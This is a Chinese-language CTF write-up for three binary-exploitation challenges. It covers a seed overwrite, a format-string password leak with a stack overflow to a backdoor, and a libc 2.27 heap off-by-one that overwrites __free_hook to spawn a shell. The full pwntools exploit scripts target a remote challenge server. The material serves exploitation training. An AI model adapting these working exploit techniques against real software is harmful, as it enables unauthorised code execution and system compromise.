## pwn

### 1.**BoFido-ucsc**

随机数题.漏洞点在于将名字读入到buf时存在可以覆盖到seed的溢出.可以让每次的seed都是同一个.

编写脚本如下:

```python
from pwn import *

#r=process("./pwn")
r=remote("39.107.58.236",48841)
pause()
r.recvuntil(b"Enter your name:")
r.send(b"a"*0x25)
r.recvuntil(b"Now start your game!")
#r.interactive()
r.recvuntil("please choose your numbers:")
r.sendline(b"187")
r.sendline(b"164")
r.sendline(b"39")
r.recvuntil("please choose your numbers:")
r.sendline(b"242")
r.sendline(b"143")
r.sendline(b"25")
r.recvuntil("please choose your numbers:")
r.sendline(b"188")
r.sendline(b"128")
r.sendline(b"73")
r.recvuntil("please choose your numbers:")
r.sendline(b"94")
r.sendline(b"5")
r.sendline(b"207")
r.recvuntil("please choose your numbers:")
r.sendline(b"233")
r.sendline(b"166")
r.sendline(b"214")
r.recvuntil("please choose your numbers:")
r.sendline(b"61")
r.sendline(b"103")
r.sendline(b"137")
r.recvuntil("please choose your numbers:")
r.sendline(b"248")
r.sendline(b"178")
r.sendline(b"38")
r.recvuntil("please choose your numbers:")
r.sendline(b"99")
r.sendline(b"55")
r.sendline(b"146")
r.recvuntil("please choose your numbers:")
r.sendline(b"237")
r.sendline(b"49")
r.sendline(b"226")
r.recvuntil("please choose your numbers:")
r.sendline(b"73")
r.sendline(b"156")
r.sendline(b"149")
r.interactive()
```

### 2.**userlogin-ucsc**

程序生成了一个随机密码,然后允许登录三次.

```C
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  void *v3; // rsp
  _QWORD v4[3]; // [rsp+0h] [rbp-40h] BYREF
  int v5; // [rsp+1Ch] [rbp-24h]
  const char *v6; // [rsp+28h] [rbp-18h]
  __int64 v7; // [rsp+30h] [rbp-10h]
  int v8; // [rsp+38h] [rbp-8h]
  int i; // [rsp+3Ch] [rbp-4h]

  v5 = argc;
  v4[2] = argv;
  v4[1] = envp;
  v8 = 16;
  v7 = 16LL;
  v3 = alloca(32LL);
  v6 = (const char *)v4;
  init(argc, argv, 0LL);
  generatePassword((__int64)v6, v8);
  for ( i = 0; i <= 2; ++i )
    login(v6);
  exit(0);
}
```

登录函数能跳转到两个漏洞函数.其中user有格式化字符串漏洞,root有栈溢出漏洞.user可以用固定密码登录,而root则使用刚刚的随机密码登录.

```c
int __fastcall login(const char *a1)
{
  char s1[44]; // [rsp+10h] [rbp-30h] BYREF
  int v3; // [rsp+3Ch] [rbp-4h]

  v3 = 16;
  printf("Password: ");
  input(s1, 32LL);
  if ( !strcmp(s1, "supersecureuser") )
    return user();
  if ( !strcmp(s1, a1) )
    return root();
  return puts("Password Incorrect.\n\n");
}
```

那么我们用格式化字符串泄露密码,再通过root的栈溢出执行后门函数即可.

编写脚本如下:

```python
from pwn import *
context.log_level='debug'
#r=process("./pwn")
r=remote("39.107.58.236",45602)
#gdb.attach(r)
pause()
r.recvuntil(b"Password: ")
r.sendline(b"supersecureuser")
r.recvuntil(b"Write Something")
r.sendline(b"%13$s")
pwd=r.recvuntil("Password")[1:-9]
print(pwd)
pause()
r.recvuntil(b":")
r.sendline(pwd)
r.recvuntil(b"Note:")
pay=b'a'*0x28+p64(0x401262)
r.sendline(pay)
r.interactive()
```

### 3.疯狂复制

libc2.27菜单堆题.容易发现在edit函数中存在off_by_one.那么合理安排堆布局,泄露libc,打__free_hook即可.

```python
from pwn import *

def new_(index,size):
	r.recvuntil(b":")
	r.sendline(b"1")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))
	r.recvuntil(b"Size ")
	r.sendline(str(size))
	return
def edi_(index,content):
	r.recvuntil(b":")
	r.sendline(b"2")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))
	r.recvuntil(b"Content: ")
	r.send(content)
	return

def show_(index):
	r.recvuntil(b":")
	r.sendline(b"3")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))
	r.recvuntil(b"Content: ")
	return

def del_(index):
	r.recvuntil(b":")
	r.sendline(b"4")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))
	return

#r=process("./pwn")
r=remote("39.107.58.236",46653)
pause()
context.log_level='debug'
new_(0,0x18)
new_(1,0x50)
new_(2,0x80)

new_(31,0xe0)
new_(30,0xe0)
new_(29,0xe0)
new_(28,0xe0)
new_(27,0xe0)
new_(26,0xe0)
new_(25,0xe0)
del_(31)
del_(30)
del_(29)
del_(28)
del_(27)
del_(26)
del_(25)

edi_(0,b'a'*0x18+b"\xf1")

del_(1)

new_(31,0xe0)
new_(30,0xe0)
new_(29,0xe0)
new_(28,0xe0)
new_(27,0xe0)
new_(26,0xe0)
new_(25,0xe0)

new_(1,0x80)
new_(3,0x50)


del_(31)
del_(30)
del_(29)
del_(28)
del_(27)
del_(26)
del_(25)

new_(31,0x80)
new_(30,0x80)
new_(29,0x80)
new_(28,0x80)
new_(27,0x80)
new_(26,0x80)
new_(25,0x80)
del_(31)
del_(30)
del_(29)
del_(28)
del_(27)
del_(26)
del_(25)

del_(2)

show_(1)

libc_base=u64(r.recvuntil(b"1.")[:-3].ljust(8,b"\x00"))-0x3EBD80
print(hex(libc_base))


new_(5,0x18)
new_(6,0x18)
new_(7,0x10)
new_(8,0x10)

pause()
edi_(5,b'a'*0x18+b"\x41")
del_(6)
pause()
new_(6,0x2f)
del_(8)
del_(7)
libc=ELF("./libc-2.27.so")
free_hook_add=libc_base+libc.sym["__free_hook"]
pay=b'a'*0x18+p64(0x21)+p64(free_hook_add)+b'a'*0x8
edi_(6,pay)
pause()
new_(9,0x10)
new_(10,0xf)
pay2=p64(libc.sym["system"]+libc_base)+b"\x00"*0x8
edi_(10,pay2)

new_(11,0x4f)
edi_(11,b"/bin/sh\x00".ljust(0x50,b'a'))
del_(11)

r.interactive()

```

